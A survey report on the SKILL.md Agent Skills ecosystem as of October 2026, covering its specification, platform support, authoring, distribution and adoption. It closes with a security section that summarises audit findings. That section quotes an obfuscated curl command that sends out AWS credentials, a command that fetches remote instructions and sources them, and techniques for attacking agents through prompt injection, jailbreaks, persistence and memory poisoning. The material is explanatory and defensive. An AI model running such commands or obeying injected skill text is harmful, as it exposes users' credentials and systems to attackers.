# Agent Skills Ecosystem: SKILL.md Format, Platform Support and Adoption (as of October 2026)

Scope note: "Agent Skills" here means the `SKILL.md` folder format for AI agents, not professional competencies. All URLs were fetched or returned by search on 23 October 2026 unless a publication date is given.

---

## What is the official or de facto Agent Skills specification, and which platforms support it?

### Takeaway
There is now a real, vendor-neutral specification: `agentskills.io`, published by Anthropic as an open standard on 18 December 2025 and maintained in the `agentskills/agentskills` repo. The core format (a folder with `SKILL.md`, YAML `name` + `description`, optional `scripts/`, `references/`, `assets/`) is stable and implemented by Claude Code, OpenAI Codex/ChatGPT, OpenCode, Microsoft Agent Framework, IBM watsonx Orchestrate, VS Code, Goose and a long tail of other agents. What is *not* standardized is everything that matters operationally: discovery paths, permission semantics, invocation controls and body-level template features.

### Cited Findings
- The specification defines a skill as "a directory containing, at minimum, a `SKILL.md` file", with optional `scripts/`, `references/`, `assets/` and any other files — [Agent Skills Specification](https://agentskills.io/specification).
- Required frontmatter is only `name` (max 64 chars; lowercase letters, numbers, hyphens; must match parent directory; no leading/trailing hyphen, no consecutive hyphens) and `description` (max 1,024 chars, non-empty, must say what the skill does and when to use it). Optional fields are `license`, `compatibility` (max 500 chars), `metadata` (string-to-string map), and `allowed-tools` (space-separated pre-approved tools, marked **Experimental**) — [Agent Skills Specification](https://agentskills.io/specification).
- Progressive disclosure is normative in the spec: stage 1 metadata (~100 tokens) loaded for all skills at startup; stage 2 the full `SKILL.md` body when activated (<5,000 tokens recommended); stage 3 files in `scripts/`, `references/`, `assets/` loaded only when required — [Agent Skills Specification](https://agentskills.io/specification).
- Anthropic published the format on 16 October 2025 as a Claude feature (Claude apps, Claude Code, API), then published it as an open standard on 18 December 2025 — [Introducing Agent Skills, 16 Oct 2025](https://www.anthropic.com/news/skills); update note: "We've published Agent Skills as an open standard for cross-platform portability" (18 Dec 2025) — [Anthropic Engineering, 16 Oct 2025](https://www.anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills).
- The `agentskills/agentskills` repository (Apache-2.0) was created 16 December 2025 and holds the spec, docs, and a `skills-ref` reference library; the site lists OpenCode, Claude Code, Claude, VS Code, Goose and OpenAI Codex as supporting clients — [GitHub: agentskills/agentskills](https://github.com/agentskills/agentskills); [agentskills.io](https://agentskills.io/).
- Microsoft ships first-class support in Microsoft Agent Framework for Python, .NET and Go: a `skills` context provider that discovers `SKILL.md` files, reads `references/` and `assets/` (up to two levels deep) and `scripts/`, and requires explicit approval for `run_skill_script` — [Microsoft Learn: Agent Skills](https://learn.microsoft.com/en-us/agent-framework/agents/skills).
- IBM watsonx Orchestrate documents the same folder + frontmatter model, with progressive disclosure (discovery → activation → execution) and optional `scripts/` and `references/` — [IBM watsonx Orchestrate: Agent skills](https://developer.watson-orchestrate.ibm.com/agent_skills/overview.md).
- OpenAI states that Codex/ChatGPT skills "build on the open agent skills standard" and that `SKILL.md` "must include `name` and `description`" — [OpenAI: Build skills](https://developers.openai.com/codex/skills).
- Claude Code states it follows the Agent Skills open standard and *extends* it with invocation control, subagent execution and dynamic context injection — [Claude Code: Extend Claude with skills](https://code.claude.com/docs/en/skills).
- Vercel's `skills.sh` directory and `npx skills` CLI treat the format as agent-agnostic and install the same skill into Claude Code, Codex, Cursor, Copilot, Windsurf, Gemini, Cline, Amp, Antigravity, OpenClaw, Droid, Goose, Kilo, Kiro CLI, Nous, OpenCode, Roo, Trae, VS Code and Zed — [skills.sh](https://skills.sh/).

### Inferences
- The de facto standard is the Anthropic-published spec, not a formal standards body (no W3C/IETF process). "Open standard" here means public spec + Apache-2.0 reference implementation + multi-vendor adoption, not accredited standardization.
- Portability is real at the *packaging* layer and weak at the *behavior* layer. A skill written only with `name`, `description`, `license`, `compatibility`, `metadata` and a plain-Markdown body will load almost everywhere; anything using platform extensions will not.
- The spec's `allowed-tools` being "Experimental" is a signal that the hardest interop problem — permissions — was deliberately left under-specified.

### Gaps
- No published governance model, RFC process, or list of voting maintainers for `agentskills/agentskills` was found. Ownership beyond "originally developed by Anthropic" is unclear.
- The `agentskills.io/clients` page renders its showcase client-side and returned no usable list; the client list above is assembled from the homepage logos, the spec repo, and individual vendor docs, so it may undercount.
- No evidence found of a formal conformance test suite beyond the `skills-ref` validator; unknown how strictly clients are tested against the spec.

---

## How do OpenCode, Claude Code and Codex discover and load skills, and where are the incompatibilities?

### Takeaway
All three use the same mental model — advertise name + description, load the body on demand — but they disagree on directories, frontmatter strictness, context budgeting and permission controls. OpenCode is the most permissive/portable reader (it reads `.opencode/`, `.claude/` and `.agents/` paths); Claude Code is the most feature-rich and the most proprietary; Codex is the most conservative and routes distribution through plugins.

### Cited Findings

**Discovery paths**

| Platform | Project paths | User/global paths | Other |
|---|---|---|---|
| Claude Code | `.claude/skills/<name>/SKILL.md` at cwd and every parent up to repo root; nested `<subdir>/.claude/skills` loads lazily; `--add-dir` dirs | `~/.claude/skills/` | Enterprise managed-settings dir; plugin `skills/`; claude.ai synced skills in `~/.claude/skills/synced/` — [Claude Code docs](https://code.claude.com/docs/en/skills) |
| OpenCode | `.opencode/skills/`, plus compat `.claude/skills/` and `.agents/skills/`, walking upward to project root | `~/.config/opencode/skills/`, `~/.claude/skills/`, `~/.agents/skills/` | Extra dirs and HTTP catalogs via `skills` array in `opencode.json` — [OpenCode docs](https://opencode.ai/docs/skills); [OpenCode v2 docs](https://v2.opencode.ai/docs/skills/) |
| Codex | `.agents/skills` in cwd, each parent up to repo root, and `$REPO_ROOT/.agents/skills` | `$HOME/.agents/skills` | `/etc/codex/skills` (admin), bundled system skills; symlinked folders followed — [OpenAI docs](https://developers.openai.com/codex/skills) |

- OpenCode also accepts plain Markdown files at a source root (e.g. `skills/git-release.md`), not only `SKILL.md` folders; the directory form is recommended because it gives the skill a private base directory for supporting files — [OpenCode v2 docs](https://v2.opencode.ai/docs/skills/).
- OpenCode's V2 implementation has a documented quirk: a root-level `SKILL.md` in an HTTP catalog produces the literal skill ID `SKILL`, while `git-release.md` produces `git-release` — [OpenCode v2 docs](https://v2.opencode.ai/docs/skills/).
- Codex scans `.agents/skills` "in every directory from your current working directory up to the repository root"; duplicate `name` values are not merged, both can appear in selectors — [OpenAI docs](https://developers.openai.com/codex/skills).
- Claude Code resolves collisions by precedence: enterprise > personal > project; a user skill replaces a bundled skill of the same name but not its aliases; plugin skills are namespaced `/plugin-name:skill-name`; added-directory collisions get a `/prefix:name` — [Claude Code docs](https://code.claude.com/docs/en/skills).
- Claude Code watches skill directories and hot-reloads `SKILL.md` edits mid-session (except in bare mode); a newly created top-level skills dir needs `/reload-skills` — [Claude Code docs](https://code.claude.com/docs/en/skills). OpenCode's community lesson says skills are loaded at startup and OpenCode must be restarted after install — [OpenCode School](https://opencode.school/lessons/skills).

**Frontmatter and strictness**

- Claude Code: "All fields are optional. Only `description` is recommended"; `name` defaults to the directory name. It ignores unrecognized fields without error and only parses frontmatter if `---` is the first line — [Claude Code docs](https://code.claude.com/docs/en/skills).
- Claude Code's proprietary fields include `when_to_use`, `argument-hint`, `arguments`, `disable-model-invocation`, `user-invocable`, `allowed-tools`, `disallowed-tools`, `model`, `effort`, `context: fork`, `agent`, `background`, `hooks`, `paths`, `shell`, plus `metadata`, `license`, `compatibility` — [Claude Code docs](https://code.claude.com/docs/en/skills).
- Those extensions are *not* portable: uploading to claude.ai, the Skills API, or packaging with `package_skill.py` accepts only `name`, `description`, `license`, `compatibility`, `metadata`, `allowed-tools`, and fails hard on extras (example error quoted for `argument-hint`) — [Claude Code docs](https://code.claude.com/docs/en/skills).
- OpenCode uses namespaced metadata keys `opencode/slash` (expose as `/name` in the TUI) and `opencode/autoinvoke` (set `"false"` to hide from model-facing selection while still allowing exact-name loads); it accepts YAML booleans as well as strings — [OpenCode docs](https://opencode.ai/docs/skills).
- Codex adds an optional `agents/openai.yaml` beside `SKILL.md` for UI metadata (`interface.display_name`, icons, brand color, default prompt), invocation policy (`policy.allow_implicit_invocation`, default `true`) and tool dependencies (`dependencies.tools`, e.g. an MCP server) — [OpenAI docs](https://developers.openai.com/codex/skills).

**Loading and context budgeting**

- Claude Code advertises skills in the `/` menu and to the model; `description` + `when_to_use` are truncated at 1,536 characters in the listing. Loaded skill content persists in context across turns, which is why Anthropic advises conciseness — [Claude Code docs](https://code.claude.com/docs/en/skills).
- Claude Code supports `disable-model-invocation: true` (manual `/name` only) and `user-invocable: false` (model-only), plus `context: fork` to run the skill in a subagent with optional `agent`, `background`, `model` and `effort` — [Claude Code docs](https://code.claude.com/docs/en/skills).
- Codex's initial skill list includes each skill's file path and is capped at 2% of the model context window, or 8,000 characters when the window is unknown. When many skills are installed Codex shortens descriptions first, then omits skills with a warning. `skills.max_context_tokens` raises the budget up to 10,000 tokens — [OpenAI docs](https://developers.openai.com/codex/skills).
- OpenCode advertises, at each model step, only each permitted skill's ID, name and description; the model must call `skill({ name: "..." })` to load the body — [OpenCode docs](https://opencode.ai/docs/skills).
- Claude Code supports dynamic context injection: a line like `` !`git diff HEAD` `` is executed and replaced with output before the model sees the skill, plus `@file` references and `${CLAUDE_PROJECT_DIR}` / `${CLAUDE_SESSION_ID}` placeholders. Synced claude.ai skills deliberately do **not** get these behaviors in local terminal sessions — [Claude Code docs](https://code.claude.com/docs/en/skills).
- OpenCode exposes skills through a native `skill` tool and an `<available_skills>` block in the tool description; it lists built-in skills first, then `.claude/skills`, `.agents/skills`, `~/.config/opencode/skills`, project `.opencode/skills` — [OpenCode v2 docs](https://v2.opencode.ai/docs/skills/).
- Codex activation is explicit (`$skill` in CLI/IDE, `@` in ChatGPT, `/skills` picker) or implicit via description matching; OpenCode is implicit via advertised descriptions or explicit via exact ID; Claude Code is implicit via description or explicit `/name` — [OpenAI docs](https://developers.openai.com/codex/skills); [OpenCode docs](https://opencode.ai/docs/skills); [Claude Code docs](https://code.claude.com/docs/en/skills).

**Permissions**

- OpenCode has the clearest declarative model: `permission.skill` maps glob patterns to `allow` / `deny` / `ask` (`deny` hides the skill entirely), overridable per agent — [OpenCode docs](https://opencode.ai/docs/skills).
- Claude Code's `allowed-tools` is a *pre-approval grant* for the turn that invokes the skill (cleared on the next user message), and `disallowed-tools` removes tools while the skill is active — [Claude Code docs](https://code.claude.com/docs/en/skills).
- Codex's only skill-level control is `policy.allow_implicit_invocation` plus enable/disable via `[[skills.config]] path = ".../SKILL.md" enabled = false` in `~/.codex/config.toml` — [OpenAI docs](https://developers.openai.com/codex/skills).

**Cross-platform file layout that actually works**

- `.agents/skills/` is read by Codex and OpenCode but **not** listed by Claude Code. `.claude/skills/` is read by Claude Code and OpenCode but **not** by Codex. `.opencode/skills/` is read only by OpenCode. A repo that wants one checked-in skill to work in all three must either duplicate/symlink it or standardize on `.agents/skills` and accept that Claude Code needs a symlink or `--add-dir`.
- Claude Code explicitly supports symlinked skill folders in enterprise/personal/project locations and de-duplicates targets — [Claude Code docs](https://code.claude.com/docs/en/skills).

### Inferences
- `.agents/skills` is emerging as the neutral convention (Codex + OpenCode + `npx skills` default), while `.claude/skills` remains the Claude-specific de facto path. This is a format-level convergence with a directory-level split.
- Because Claude Code treats all frontmatter as optional and OpenCode/Codex require `name` + `description`, a skill authored for Claude Code can silently fail or be unselectable elsewhere. Portable authoring should treat the spec's two required fields as mandatory.
- Claude Code's proprietary features (hooks, `context: fork`, `!` injection) create lock-in that is stronger than the file format suggests; conversely Codex's plugin system creates lock-in at the distribution layer.
- No platform offers a sandbox for skill scripts by default; permissions are about *tool access*, not process isolation.

### Gaps
- No source found stating whether Claude Code plans to read `.agents/skills`; the absence in docs is not proof of a roadmap decision.
- Codex's exact handling of `.claude/skills` is undocumented; it is not listed, but undocumented compatibility shims cannot be ruled out.
- Cursor, Copilot, Windsurf, Gemini CLI and Zed are listed by skills.sh as supported install targets, but their native discovery rules and frontmatter extensions were not verified in vendor docs for this note.
- No benchmark compares trigger reliability *across* these three harnesses on the same skill set.

---

## What does a high-quality SKILL.md look like: frontmatter, description, body, scripts, references, assets?

### Takeaway
Quality is mostly about *selection* and *restraint*, not completeness. A strong skill has a precise third-person description with trigger vocabulary, a short imperative body that assumes a capable model, one-level-deep references, and scripts for anything deterministic. Anthropic's own guidance is explicitly "concise is key" and "default assumption: Claude is already very smart".

### Cited Findings
- Anthropic's authoring guide: "The context window is a public good"; only add context the model does not already have; challenge each paragraph's token cost — [Skill authoring best practices](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices).
- Description rules: always third person ("Processes Excel files…", not "I can help you…"), include both what it does and when to use it, include specific trigger keywords; the description is the primary selection signal among "potentially 100+ available Skills" — [Best practices](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices).
- Naming: prefer gerund form (`processing-pdfs`, `analyzing-spreadsheets`); avoid vague names (`helper`, `utils`) and reserved words (`anthropic`, `claude`); `name` cannot contain XML tags — [Best practices](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices).
- Body size: keep `SKILL.md` under 500 lines; split into reference files when approaching the limit — [Best practices](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices). The spec separately recommends <5,000 tokens for the body — [Specification](https://agentskills.io/specification).
- "Degrees of freedom" should match task fragility: high freedom (prose heuristics) for open-ended work such as code review; low freedom (exact script and flags, "do not modify") for migrations and other fragile sequences — [Best practices](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices).
- Reference hygiene: keep references one level deep from `SKILL.md` (nested references cause the model to `head -100` and read partially); give reference files longer than 100 lines a table of contents; name files descriptively (`form_validation_rules.md`, not `doc2.md`) — [Best practices](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices).
- Workflows should be explicit checklists with numbered steps and feedback loops ("run validator → fix → re-run"); the PDF form-filling example uses five steps with a validation gate before writing output — [Best practices](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices).
- Scripts: prefer pre-written utility scripts over generated code for reliability, token savings and consistency; state explicitly whether to *run* a script or *read* it as reference; scripts should handle errors themselves rather than deferring to the model; no "voodoo constants" — [Best practices](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices).
- Anti-patterns: Windows-style backslash paths, offering many equivalent options instead of one default with an escape hatch, time-sensitive statements ("before August 2025…"), inconsistent terminology — [Best practices](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices).
- Concrete reference example: Anthropic's `frontend-design` skill is a pure-prose skill (`name`, `description`, `license` only, no `metadata`) with sections "Ground your designs in the subject matter", "Design principles", "Process: plan, review against the brief, build, critique", "Restraint and self-critique" — [frontend-design/SKILL.md](https://raw.githubusercontent.com/anthropics/skills/main/skills/frontend-design/SKILL.md).
- The PDF skill pattern (from Anthropic's engineering post) keeps `SKILL.md` lean and moves form-filling into `forms.md`, with a reference file and a Python script that extracts form fields without loading the script or PDF into context — [Anthropic Engineering, 16 Oct 2025](https://www.anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills).
- Model-dependence: Anthropic advises testing a skill with every model it will run on (Haiku needs more guidance, Opus less) and building at least three evaluations before writing extensive docs — [Best practices](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices).
- A minimal valid example from the spec:
  ```yaml
  ---
  name: pdf-processing
  description: Extract PDF text, fill forms, merge files. Use when handling PDFs.
  license: Apache-2.0
  metadata:
    author: example-org
    version: "1.0"
  ---
  ```
  — [Specification](https://agentskills.io/specification).

### Inferences
- The highest-leverage 20 words in a skill are the `description`; every platform's routing depends on it, and Claude Code/Codex both truncate or compress descriptions under load.
- "Reference files" are a context-engineering device, not documentation for humans. The one-level rule exists because model file-reading is lazy and partial.
- Skills that wrap a deterministic CLI (rather than re-implementing logic in prose) age better and are more portable, because scripts are opaque to the model and therefore unaffected by model changes.
- The `frontend-design` example shows a legitimate second style: long-form taste/principle guidance can work when the skill is explicitly invoked and the domain is judgment-heavy. That style is the exception, not the template.

### Gaps
- No controlled study was found isolating *which* authoring choices (description length, body length, checklist vs prose, with/without scripts) change task success. Anthropic's guidance is practitioner experience, not measured effect sizes.
- No standard schema for `metadata` (e.g. `version`, `author`, `category`) beyond "string-to-string map"; ecosystem tooling may expect keys that are not specified.
- Unknown whether the 500-line and 5,000-token guidance reflects a hard model limit or a heuristic; no published ablation.

---

## How are skills distributed and installed: marketplaces, `npx skills`, git repos, plugins, global vs project scope?

### Takeaway
Three distribution layers coexist: (1) raw git repos + `npx skills`, which is cross-agent and leaderboard-driven; (2) agent-native plugin/package systems (Claude Code plugins + marketplaces, Codex/ChatGPT plugins); (3) managed enterprise channels (Claude managed settings, Codex admin dir). `npx skills` is the closest thing to a universal installer, but "install" means copying files into each agent's directory, with no lockfile-grade dependency resolution.

### Cited Findings
- `npx skills add <owner/repo>` (or a `skills.sh/p/<pack-id>` URL) downloads a skill and "configures it for use with your AI agent"; packs bundle public and private skills into one install command — [skills.sh CLI docs](https://skills.sh/docs/cli); [skills.sh docs](https://skills.sh/docs).
- Ranking is driven by anonymous CLI telemetry (skill name, files, timestamp; no personal/device info); opt out with `DISABLE_TELEMETRY=1` — [skills.sh CLI docs](https://skills.sh/docs/cli).
- The CLI is open source at `github.com/vercel-labs/skills` and is made by Vercel — [skills.sh docs](https://skills.sh/docs).
- Anthropic's repo can be installed as a Claude Code plugin marketplace: `/plugin marketplace add anthropics/skills`, then `/plugin install document-skills@anthropic-agent-skills` or `example-skills@anthropic-agent-skills` — [GitHub: anthropics/skills](https://github.com/anthropics/skills).
- A Claude Code plugin is a directory of skills, agents, hooks, MCP servers and other components, usually with `.claude-plugin/plugin.json`; a marketplace is a repo/dir with `.claude-plugin/marketplace.json` that lists plugins and fetch locations — "It's a catalog, not a hosted store" — [Claude Code plugins overview](https://code.claude.com/docs/en/plugins/overview).
- Claude Code marketplace tiers: **official** and **community** names are accepted only for `github.com/anthropics/` sources; everything else is third-party. Anthropic's official marketplace is added automatically on first interactive session unless blocked by managed policy — [Claude Code plugins overview](https://code.claude.com/docs/en/plugins/overview).
- Claude Code plugin install scopes: **user** (all projects on this machine), **project** (committed `.claude/settings.json`, each collaborator still installs locally), **local** (this repo, this user) — [Claude Code plugins overview](https://code.claude.com/docs/en/plugins/overview).
- Organizations can allowlist/block marketplaces, force-install plugins, turn off session-only loading, and lock skills to plugin sources (`strictPluginOnlyCustomization`) via managed settings — [Claude Code plugins overview](https://code.claude.com/docs/en/plugins/overview); [Claude Code skills](https://code.claude.com/docs/en/skills).
- Codex: "Use skills to design the workflow itself, then package it as a plugin when you want other people to install it." Plugins are distributed through "the universal plugin directory shared by ChatGPT and Codex" and can bundle skills, MCP server connections and assets — [OpenAI: Build skills](https://developers.openai.com/codex/skills).
- Codex local install helper: `$skill-installer linear` (or prompt it to download from another repo); installed skills are detected automatically — [OpenAI: Build skills](https://developers.openai.com/codex/skills).
- Codex disables a skill without deleting it via `[[skills.config]] path = ".../SKILL.md" enabled = false`; restart required — [OpenAI: Build skills](https://developers.openai.com/codex/skills).
- OpenCode has no first-party marketplace, but supports arbitrary local directories and **HTTP catalogs**: a base URL with `index.json` listing `{name, version, files[]}`, with files fetched from `<base-url>/<skill>/<file>` and cached (bump `version` to refresh) — [OpenCode v2 docs](https://v2.opencode.ai/docs/skills/).
- OpenCode config `skills` arrays are additive across every discovered config document — [OpenCode v2 docs](https://v2.opencode.ai/docs/skills/).
- Anthropic added organization-wide skills management and a partner-built skills directory on 18 December 2025 — [Introducing Agent Skills update note](https://www.anthropic.com/news/skills).
- Examples of vendor-published skill repos: HashiCorp (`npx skills add hashicorp/agent-skills/<installation-path>`, with a lifecycle status per skill: active / deprecation-candidate / deprecated / retired) — [hashicorp/agent-skills SKILLS.md](https://github.com/hashicorp/agent-skills/blob/main/SKILLS.md); Cloudflare, Replicate, Microsoft Azure, Supabase, Prisma, Neon, shadcn, Vercel, Google and Feishu/Lark collections appear on skills.sh — [skills.sh](https://skills.sh/); [OpenCode School](https://opencode.school/lessons/skills).
- A secondary guide (Oct 2026) describes the landscape as four layers — app marketplaces (few hundred Claude Code plugins), install tools (`npx skills`, `gh skill`), large directories (SkillsMP claims 3M+ `SKILL.md` files; Smithery ~24k skills), and GitHub "awesome" lists — [mac.install.guide, 11 Oct 2026](https://mac.install.guide/skills/directories).

### Inferences
- The distribution center of gravity is shifting from "repo of folders" to "plugin/pack" because raw skill folders have no version, dependency, or update semantics. Anthropic and OpenAI both now say: author as a skill, distribute as a plugin.
- `npx skills` is a *copy installer*, not a package manager. There is no visible lockfile, integrity hash, or transitive dependency resolution in the documented CLI, which is a structural security gap.
- Global scope is usually the wrong default for team workflows: global installs are invisible to code review, while project-scoped `.claude/skills` or `.agents/skills` can be reviewed, versioned and diffed.
- Enterprise buyers are being given governance controls (allowlists, force-install, plugin-only mode) before they are given provenance controls (signing, SBOM). That ordering is backwards relative to npm/PyPI history.

### Gaps
- No official count of Claude Code plugins or marketplaces was found; "a few hundred plugins" is a secondary estimate. Anthropic's marketplace page is JS-rendered and was not enumerable.
- No reliable, primary figure for total skills or total installs across the ecosystem. See the adoption section for conflicting numbers.
- The `gh skill` installer mentioned by the secondary guide was not verified against GitHub documentation.
- Version pinning/rollback behavior of `npx skills` (e.g. installing a specific commit or tag) is not documented in the CLI reference fetched.

---

## What adoption evidence exists in 2025–2026?

### Takeaway
Adoption is genuinely large by repository and install-count signals, and the format is supported by every major coding agent. But the numbers are self-reported or telemetry-derived, several are inconsistent, and there is credible counter-evidence that skills often do not fire or do not improve outcomes versus simply putting context in `AGENTS.md`. Treat "millions of installs" as ecosystem activity, not proven value.

### Cited Findings
- `anthropics/skills` showed **183.2k stars, 21.7k forks, 414 open issues, ~1k open PRs** on 23 October 2026 — [GitHub: anthropics/skills](https://github.com/anthropics/skills).
- `agentskills/agentskills` (spec repo, created 16 Dec 2025) displayed roughly **4,621 stars** on the docs site — [agentskills.io](https://agentskills.io/).
- skills.sh leaderboard (installs, all-time, as displayed 23 Oct 2026): `find-skills` (vercel-labs/skills) **4.0M**; `grill-me` (mattpocock/skills) **1.4M**; `agent-browser` **1.2M**; `grill-with-docs` **1.2M**; `hyperframes-cli` **1.2M**; `frontend-design` (anthropics/skills) **1.0M**; `skill-creator` (anthropics/skills) **413.4K**; `pptx` (anthropics/skills) **241.1K**; `brainstorming` (obra/superpowers) **403.0K** — [skills.sh](https://skills.sh/).
- The same page's "All Time" tab label reads **1,476,724**, but the top single skill shows 4.0M installs, so the label cannot be a total-install count; its meaning is ambiguous (possibly indexed skills or a filtered window) — [skills.sh](https://skills.sh/).
- Anthropic partner quotes at launch: Box (document transformation), Canva (customizing agents), Notion (predictable complex tasks), Rakuten (management-accounting workflows cut from a day to an hour) — [Introducing Agent Skills, 16 Oct 2025](https://www.anthropic.com/news/skills).
- Codex ships bundled system skills (`skill-creator`, plan skills), a `$skill-installer`, and curated examples (`gh-fix-ci`, `pdf`, `linear`) in `openai/skills` — [OpenAI: Build skills](https://developers.openai.com/codex/skills).
- Claude Code ships bundled skills including `/doctor`, `/code-review`, `/batch`, `/debug`, `/loop`, `/claude-api`, `/run`, `/verify` — [Claude Code docs](https://code.claude.com/docs/en/skills).
- Growth signal: Snyk observed daily skill submissions rising from **under 50 in mid-January 2026 to over 500 by early February 2026**, a ~10x increase in weeks — [Snyk ToxicSkills, 5 Feb 2026](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub).
- Secondary report: skills.sh reached **one million listings and ~280 million installs in seven months**, faster than GitHub, the App Store or npm — [Inference Wire, 29 Sep 2026](https://inferencewire.com/insights/ai-skills-registry-hits-one-million-faster-than-app-store). This is a single secondary outlet and was not independently verified.
- Secondary guide: the largest directory counts **over 3 million `SKILL.md` files** including copies/experiments/abandoned projects, while Claude Code's built-in marketplace lists **a few hundred plugins** — [mac.install.guide, 11 Oct 2026](https://mac.install.guide/skills/directories).
- Platform adoption proxy (not skills-specific): JetBrains Developer Ecosystem Survey 2026 (15,000+ professional developers, May–July 2026) reports Claude Code at **39%** of professional developers at work (up from 18% in Jan 2026), Codex at **16%** (up from 3%), GitHub Copilot at 21%, Cursor 12%, **OpenCode 7%** — [JetBrains Research, Aug 2026](https://blog.jetbrains.com/research/2026/08/ai-coding-agent-adoption-2026/).
- Stack Overflow 2026 reports Claude Code (66%) and GitHub Copilot (59%) as the leading coding agents among respondents — [Stack Overflow Developer Survey 2026](https://survey.stackoverflow.co/2026/ai).
- Community attention: "Agent Skills (agentskills.io)" reached **544 points and 260 comments** on Hacker News (~Feb 2026) — [HN 46871173](https://news.ycombinator.com/item?id=46871173). A later thread, "Skills are quietly becoming the unit of agent knowledge" (~Apr 2026), argued skills went "from a niche Claude Code feature to something every major runtime supports" but that distribution "still feels early" — [HN 47475832](https://news.ycombinator.com/item?id=47475832).
- Skeptical community threads: "You're probably using Agent Skills wrong" (~Jul 2026, 74 points) — [HN 48624327](https://news.ycombinator.com/item?id=48624327); "Are most agent skills just fancy system prompts with a name?" (~Jun 2026), where a commenter reports running SkillCompass across 881 ClawHub skills and finding **46% scored poorly on functional depth** — [HN 47760931](https://news.ycombinator.com/item?id=47760931). This is an unverified vendor-adjacent anecdote, not a study.
- Evaluation tooling is emerging: `agent-skills-eval` (Show HN, ~May 2026, 79 points) tests whether skills improve outputs using tool-call assertions — [HN 48046023](https://news.ycombinator.com/item?id=48046023); Anthropic's `skill-creator` now runs A/B subagent comparisons — [HN 48046023 discussion](https://news.ycombinator.com/item?id=48046023).
- Counter-evidence: Vercel's Next.js 16 eval found skills were **not invoked in 56% of cases**; default skills scored **53% vs 53% baseline** (no improvement); with explicit "use the skill" instructions they reached **79%**; an 8KB compressed docs index in `AGENTS.md` reached **100%** — [Vercel, 27 Jan 2026](https://vercel.com/blog/agents-md-outperforms-skills-in-our-agent-evals).
- Vercel also found wording fragility: "You MUST invoke the skill" caused doc-anchoring and missed project context, while "explore project first, then invoke skill" performed better — same skill, same docs — [Vercel, 27 Jan 2026](https://vercel.com/blog/agents-md-outperforms-skills-in-our-agent-evals).

### Inferences
- Repository stars (183k) and per-skill install counts (millions) indicate a large *authoring and trial* population, but install telemetry counts CLI installs, not active use, retention, or task success.
- The strongest adoption evidence is supply-side: every major vendor ships skills, publishes skill repos, and documents the format. The weakest evidence is demand-side value: the one rigorous public eval found no benefit without explicit prompting.
- The Vercel result and the "skills don't trigger" complaints are consistent with each other and with Codex's own design (a 2% context budget, description shortening). This suggests the bottleneck is routing, not content.
- Growth in raw listings (1M–3M) should be discounted heavily: most are copies, generated variants, or abandoned. The Snyk finding that 36.8% have security flaws is a better indicator of low curation than of quality.

### Gaps
- No representative survey of *skill usage* (as opposed to agent usage) was found. JetBrains/Stack Overflow measure agents, not skills.
- Conflicting ecosystem-size numbers (1.47M vs 1M listings vs 3M files) cannot be reconciled from primary sources; skills.sh does not publish a methodology page with totals.
- No public data on enterprise seat counts, paid skill revenue, or retention. Marketplace "installs" are not deduplicated by user.
- The 46% "poor functional depth" figure comes from a single HN comment about a product (SkillCompass); the underlying dataset/methodology was not published in a form that could be verified.

---

## What security and governance issues exist: prompt injection, untrusted skills, permissions, supply chain, secrets?

### Takeaway
Skills are a software supply chain with a natural-language attack surface, and the ecosystem's first large audit found serious problems: ~37% of scanned skills had at least one flaw, 13.4% had a critical one, and 76 confirmed malicious payloads. The distinctive risk is that a skill inherits the agent's full privileges and can attack through prose as well as code, so code scanners alone are insufficient. Governance is emerging (permission patterns, managed settings, marketplace allowlists, scanners) but is not yet a security boundary.

### Cited Findings
- Snyk ToxicSkills scanned **3,984 skills from ClawHub and skills.sh as of 5 February 2026**: **13.4% (534)** had at least one critical issue; **36.82% (1,467)** had at least one flaw; **76 confirmed malicious payloads**; **8 malicious skills still live** on ClawHub at publication — [Snyk, 5 Feb 2026](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub).
- Detection-rate table: among confirmed malicious skills, **100%** contained malicious code, **91%** prompt injection, **100%** suspicious download, **63%** credential mishandling; among the curated skills.sh top 100, prompt-injection and malicious-code detection were **0%** — [Snyk](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub).
- Why skills are worse than packages: they inherit shell access, filesystem read/write, credentials in env/config, messaging ability, and persistent memory; publishing on ClawHub required "a `SKILL.md` Markdown file and a GitHub account that's one week old. No code signing. No security review. No sandbox by default." — [Snyk](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub).
- Attack techniques documented: (1) external malware distribution via "Prerequisites" sections with `curl`, password-protected ZIPs and `chmod +x`; (2) obfuscated exfiltration using base64/Unicode, e.g. decoding to `curl ... $(cat ~/.aws/credentials | base64)`; (3) security disablement and destructive intent, including DAN-style jailbreaks and persistence via `systemctl` — [Snyk](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub).
- Remote instruction loading (`curl https://remote-server.com/instructions.md | source`) makes a reviewed skill mutable after review; 2.9% of ClawHub skills and 21% of malicious samples did this — [Snyk](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub).
- Hardcoded secrets appeared in **10.9%** of all ClawHub skills and **32%** of malicious samples; third-party content exposure in **17.7%** of ClawHub skills and **9%** of the skills.sh top 100 — [Snyk](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub).
- OWASP's Agentic Skills Top 10 makes "Malicious Skills" (AST01) a Critical, all-platform risk: skills "execute with the full permissions of the host agent", gaining API keys, SSH credentials, wallet files, browser data and shell. It documents typosquatting (`google-workspace` vs `gogle-workspace`), fake "Prerequisites" install commands, ClickFix prompts, `SOUL.md` persistence surviving uninstall, and `MEMORY.md` poisoning — [OWASP AST01](https://owasp.org/www-project-agentic-skills-top-10/ast01).
